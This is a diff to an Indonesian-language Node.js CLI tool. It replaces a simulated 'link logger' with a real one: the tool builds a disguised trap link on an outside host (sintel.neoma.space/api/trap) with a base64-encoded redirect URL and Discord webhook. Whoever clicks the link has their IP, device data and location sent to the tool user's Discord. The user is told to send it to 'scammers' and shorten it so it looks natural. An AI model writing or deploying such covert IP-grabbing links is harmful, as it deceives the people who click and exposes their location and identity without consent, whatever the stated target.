@@ -104,21 +104,39 @@ function handleGetContactGuide() {
 }
 
 async function handleLinkLogger() {
-    console.log(chalk.yellow('\nFitur ini membantu Anda mendapatkan Alamat IP & Lokasi Penipu.'));
-    const { url } = await inquirer.prompt([
+    console.log('\n' + chalk.bold.bgRed(' REAL IP LOGGER (DISCORD) '));
+    console.log(chalk.yellow('Fitur ini akan membuat link jebakan REAL. Ketika diklik target, lokasi/IP akan dikirim ke Discord lo.'));
+
+    const { url, webhook } = await inquirer.prompt([
         {
             type: 'input',
             name: 'url',
-            message: 'Masukkan URL tujuan asli (misal: imagebb.com/bukti-transfer):',
+            message: 'Masukkan URL target asli (buat ngalihin target) [misal: https://imgbb.com]:',
             default: 'https://imgbb.com'
+        },
+        {
+            type: 'input',
+            name: 'webhook',
+            message: 'Masukkan Discord Webhook URL lo (buat nerima log lokasi target):'
         }
     ]);
 
-    const result = await createTrackingLink(url);
-    printSuccess('Link Pelacakan Berhasil Dibuat (Simulasi)');
-    console.log(`Gunakan: ${chalk.bold.underline('https://grabify.link/')}`);
-    console.log(`Token Pelacakan: ${chalk.green('ID-' + Math.random().toString(36).substr(2, 9).toUpperCase())}`);
-    console.log(chalk.dim('Tips: Masukkan URL tadi ke Grabify.link untuk mendapatkan real link.'));
+    if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+        printError('Webhook tidak valid. Butuh URL Webhook Discord buat nerima notif tracking.');
+        return main();
+    }
+
+    const tBase = Buffer.from(url).toString('base64');
+    const wBase = Buffer.from(webhook).toString('base64');
+
+    // Use the user's Vercel Domain if deployed, otherwise fallback to local/ngrok or just print the relative one
+    const trapLink = `https://sintel.neoma.space/api/trap?t=${tBase}&w=${wBase}`;
+
+    printSuccess('Link Pelacakan Berhasil Dibuat (REAL)!');
+    console.log(`\nLink Jebakan: ${chalk.green.bold.underline(trapLink)}`);
+    console.log(chalk.dim('Kirim link di atas ke penipu. Pas diklik, data HP & lokasinya langsung masuk ke Discord lo!'));
+    console.log(chalk.dim('\nTips: Kalau dirasa terlalu panjang, lu bisa url-shorten link di atas (misal s.id atau bit.ly) biar lebih natural.'));
+
     main();
 }
 
